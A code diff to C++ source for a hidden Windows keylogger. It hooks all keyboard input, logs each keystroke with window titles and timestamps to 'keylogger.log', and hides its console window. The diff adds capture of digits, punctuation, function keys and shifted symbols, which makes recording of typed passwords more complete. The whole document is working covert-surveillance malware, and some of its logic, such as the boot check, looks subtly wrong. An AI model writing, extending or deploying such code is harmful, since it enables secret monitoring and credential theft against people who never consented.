@@ -9,19 +9,20 @@
 #include <map>
 
 // Configuration settings
-#define INVISIBLE  // Set to either INVISIBLE or VISIBLE for window visibility
-#define BOOTWAIT   // Set to either BOOTWAIT or NOWAIT to control boot delay behavior
-#define FORMAT 0   // 0 = Default, 10 = Decimal, 16 = Hexadecimal
-#define MOUSEIGNORE // Set to ignore mouse clicks
+#define INVISIBLE  
+#define BOOTWAIT   
+#define FORMAT 0   
+#define MOUSEIGNORE 
 
 // Global variables
-HHOOK _hook; // Hook handle
-KBDLLHOOKSTRUCT kbdStruct; // Key event data
-std::ofstream output_file; // Output file stream for logging
+HHOOK _hook;
+KBDLLHOOKSTRUCT kbdStruct;
+std::ofstream output_file;
 
-// Key mappings for FORMAT 0 (default)
+// Extended key mappings
 #if FORMAT == 0
 const std::map<int, std::string> keyname{
+    // Special keys
     {VK_BACK, "[BACKSPACE]"},
     {VK_RETURN, "\n"},
     {VK_SPACE, "_"},
@@ -44,13 +45,58 @@ const std::map<int, std::string> keyname{
     {VK_DOWN, "[DOWN]"},
     {VK_PRIOR, "[PG_UP]"},
     {VK_NEXT, "[PG_DOWN]"},
-    {VK_OEM_PERIOD, "."},
-    {VK_DECIMAL, "."},
-    {VK_OEM_PLUS, "+"},
-    {VK_OEM_MINUS, "-"},
-    {VK_ADD, "+"},
-    {VK_SUBTRACT, "-"},
-    {VK_CAPITAL, "[CAPSLOCK]"}
+
+    // Numbers and numpad
+    {0x30, "0"}, {VK_NUMPAD0, "0"},
+    {0x31, "1"}, {VK_NUMPAD1, "1"},
+    {0x32, "2"}, {VK_NUMPAD2, "2"},
+    {0x33, "3"}, {VK_NUMPAD3, "3"},
+    {0x34, "4"}, {VK_NUMPAD4, "4"},
+    {0x35, "5"}, {VK_NUMPAD5, "5"},
+    {0x36, "6"}, {VK_NUMPAD6, "6"},
+    {0x37, "7"}, {VK_NUMPAD7, "7"},
+    {0x38, "8"}, {VK_NUMPAD8, "8"},
+    {0x39, "9"}, {VK_NUMPAD9, "9"},
+
+    // Symbols and punctuation
+    {VK_OEM_PERIOD, "."}, {VK_DECIMAL, "."},
+    {VK_OEM_PLUS, "+"}, {VK_ADD, "+"},
+    {VK_OEM_MINUS, "-"}, {VK_SUBTRACT, "-"},
+    {VK_OEM_COMMA, ","},
+    {VK_OEM_1, ";"},
+    {VK_OEM_2, "/"},
+    {VK_OEM_3, "`"},
+    {VK_OEM_4, "["},
+    {VK_OEM_5, "\\"},
+    {VK_OEM_6, "]"},
+    {VK_OEM_7, "'"},
+
+    // Function keys
+    {VK_F1, "[F1]"},
+    {VK_F2, "[F2]"},
+    {VK_F3, "[F3]"},
+    {VK_F4, "[F4]"},
+    {VK_F5, "[F5]"},
+    {VK_F6, "[F6]"},
+    {VK_F7, "[F7]"},
+    {VK_F8, "[F8]"},
+    {VK_F9, "[F9]"},
+    {VK_F10, "[F10]"},
+    {VK_F11, "[F11]"},
+    {VK_F12, "[F12]"},
+
+    // Additional control keys
+    {VK_CAPITAL, "[CAPSLOCK]"},
+    {VK_NUMLOCK, "[NUMLOCK]"},
+    {VK_SCROLL, "[SCROLLLOCK]"},
+    {VK_SNAPSHOT, "[PRINTSCREEN]"},
+    {VK_PAUSE, "[PAUSE]"},
+    {VK_INSERT, "[INSERT]"},
+    {VK_DELETE, "[DELETE]"},
+
+    // Mathematical operations
+    {VK_MULTIPLY, "*"},
+    {VK_DIVIDE, "/"}
 };
 #endif
 
@@ -62,17 +108,15 @@ bool IsSystemBooting();
 int Save(int key_stroke);
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
 
-// Hook callback function
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
-        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam); // Capture the key event
-        Save(kbdStruct.vkCode); // Save the key press
+        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+        Save(kbdStruct.vkCode);
     }
-    return CallNextHookEx(_hook, nCode, wParam, lParam); // Pass the hook event to the next hook
+    return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-// Function to set the keyboard hook
 void SetHook()
 {
     if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
@@ -80,20 +124,17 @@ void SetHook()
     }
 }
 
-// Function to release the hook
 void ReleaseHook()
 {
     UnhookWindowsHookEx(_hook);
 }
 
-// Function to save the key stroke into the log file
 int Save(int key_stroke)
 {
     std::stringstream output;
-    static char lastwindow[256] = ""; // Track the last active window
+    static char lastwindow[256] = "";
 
 #ifndef MOUSEIGNORE
-    // Ignore mouse clicks (1 and 2 correspond to mouse events)
     if (key_stroke == 1 || key_stroke == 2) {
         return 0;
     }
@@ -104,7 +145,6 @@ int Save(int key_stroke)
     HKL layout = NULL;
 
     if (foreground) {
-        // Get the keyboard layout of the active window
         threadID = GetWindowThreadProcessId(foreground, NULL);
         layout = GetKeyboardLayout(threadID);
     }
@@ -115,7 +155,6 @@ int Save(int key_stroke)
 
         if (strcmp(window_title, lastwindow) != 0) {
             strcpy_s(lastwindow, sizeof(lastwindow), window_title);
-            // Log the window title and timestamp
             struct tm tm_info;
             time_t t = time(NULL);
             localtime_s(&tm_info, &t);
@@ -125,38 +164,48 @@ int Save(int key_stroke)
         }
     }
 
-    // Format key stroke based on configuration
-#if FORMAT == 10
-    output << '[' << key_stroke << ']'; // Decimal format
-#elif FORMAT == 16
-    output << std::hex << "[" << key_stroke << ']'; // Hexadecimal format
-#else
+    bool shift_pressed = (GetKeyState(VK_SHIFT) & 0x1000) ||
+        (GetKeyState(VK_LSHIFT) & 0x1000) ||
+        (GetKeyState(VK_RSHIFT) & 0x1000);
+
+    // Handle normal keys and shift combinations
     if (keyname.find(key_stroke) != keyname.end()) {
-        output << keyname.at(key_stroke); // Predefined key names
+        if (shift_pressed && key_stroke >= 0x30 && key_stroke <= 0x39) {
+            // Handle shift + number combinations
+            switch (key_stroke) {
+            case 0x30: output << ")"; break;
+            case 0x31: output << "!"; break;
+            case 0x32: output << "@"; break;
+            case 0x33: output << "#"; break;
+            case 0x34: output << "$"; break;
+            case 0x35: output << "%"; break;
+            case 0x36: output << "^"; break;
+            case 0x37: output << "&"; break;
+            case 0x38: output << "*"; break;
+            case 0x39: output << "("; break;
+            default: output << keyname.at(key_stroke);
+            }
+        }
+        else {
+            output << keyname.at(key_stroke);
+        }
     }
     else {
         char key;
-        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // Caps lock state
+        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
-        // Check for shift key
-        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
-            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
-            (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
+        if (shift_pressed) {
             lowercase = !lowercase;
         }
 
-        // Map virtual key to character
         key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
 
-        // Convert to lowercase if necessary
         if (!lowercase) {
             key = tolower(key);
         }
         output << char(key);
     }
-#endif
 
-    // Log to file and console
     output_file << output.str();
     output_file.flush();
     std::cout << output.str();
@@ -164,36 +213,31 @@ int Save(int key_stroke)
     return 0;
 }
 
-// Function to hide or show the console window
 void Stealth()
 {
 #ifdef VISIBLE
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // Show the console
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
 #endif
 
 #ifdef INVISIBLE
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // Hide the console
-    FreeConsole(); // Detach the process from the console window
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
+    FreeConsole();
 #endif
 }
 
-// Function to check if the system is still booting
 bool IsSystemBooting()
 {
     return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
 }
 
-// Main function
 int main()
 {
-    // Set the visibility of the console window
     Stealth();
 
-    // Handle system boot delay
 #ifdef BOOTWAIT
     while (IsSystemBooting()) {
         std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
-        Sleep(10000); // Wait for 10 seconds
+        Sleep(10000);
     }
 #endif
 
@@ -201,15 +245,12 @@ int main()
     std::cout << "Skipping boot metrics check.\n";
 #endif
 
-    // Open the output log file
     const char* output_filename = "keylogger.log";
     std::cout << "Logging output to " << output_filename << std::endl;
     output_file.open(output_filename, std::ios_base::app);
 
-    // Set the keyboard hook
     SetHook();
 
-    // Run the message loop to keep the application active
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {}
 
